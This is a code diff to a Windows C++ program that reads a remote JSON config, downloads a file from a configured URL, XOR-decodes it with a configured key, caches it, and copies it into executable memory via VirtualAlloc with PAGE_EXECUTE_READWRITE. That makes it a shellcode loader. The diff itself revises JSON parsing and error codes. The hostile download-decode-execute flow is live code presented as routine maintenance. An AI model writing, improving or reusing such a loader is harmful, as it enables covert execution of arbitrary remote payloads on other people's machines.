@@ -1,5 +1,4 @@
 #include <windows.h>
-#include <chrono>
 #include <thread>
 #include <vector>
 #include <wininet.h>
@@ -132,14 +131,31 @@ vector<unsigned char> download_to_memory(const char* url) {
 }
 
 const char* find_value(const char* json, const char* key) {
-    static char buffer[512];
-    const char* pos = strstr(json, key);
+    static char buffers[80][5120];
+    static int buf_idx = 0;
+    char* buffer = buffers[buf_idx];
+    buf_idx = (buf_idx + 1) % 8;
+    char search_key[256];
+    search_key[0] = '"';
+    int k = 0;
+    while(key[k] && k < 250) { 
+        search_key[k+1] = key[k]; 
+        k++; 
+    }
+    search_key[k+1] = '"';
+    search_key[k+2] = '\0';
+    const char* pos = strstr(json, search_key);
     if (!pos) return nullptr;
     pos = strchr(pos, ':');
     if (!pos) return nullptr;
+    
     while (*pos && (*pos == ':' || *pos == ' ' || *pos == '"')) pos++;
+    
     int i = 0;
     while (*pos && *pos != '"' && *pos != ',' && *pos != '}' && i < 511) {
+        if (*pos == '\\' && *(pos + 1) != '\0') {
+            pos++;
+        }
         buffer[i++] = *pos++;
     }
     buffer[i] = 0;
@@ -185,17 +201,17 @@ int main() {
     
     const char* json = (const char*)configData.data();
     const char* enable = find_value(json, "enable");
-    if (!enable || lstrcmpA(enable, "true") != 0) return 0;
+    if (!enable || lstrcmpA(enable, "true") != 0) return -1;
     
     const char* version = find_value(json, "version");
     const char* file_url = find_value(json, "file_url");
     const char* ps = find_value(json, "ps");
-    if (!version || !file_url || !ps) return -1;
-    
+    if (!version || !file_url || !ps) return -2;
+
     vector<unsigned char> fileData = load_from_cache(version);
     if (fileData.empty()) {
         fileData = download_to_memory(file_url);
-        if (fileData.empty()) return -1;
+        if (fileData.empty()) return -3;
         save_to_cache(version, fileData);
     }
     
@@ -203,7 +219,7 @@ int main() {
     apply_xor(fileData, ps, lstrlenA(ps));
     
     LPVOID execMemory = VirtualAlloc(NULL, fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!execMemory) return -1;
+    if (!execMemory) return -4;
     
     memcpy(execMemory, fileData.data(), fileData.size());
     
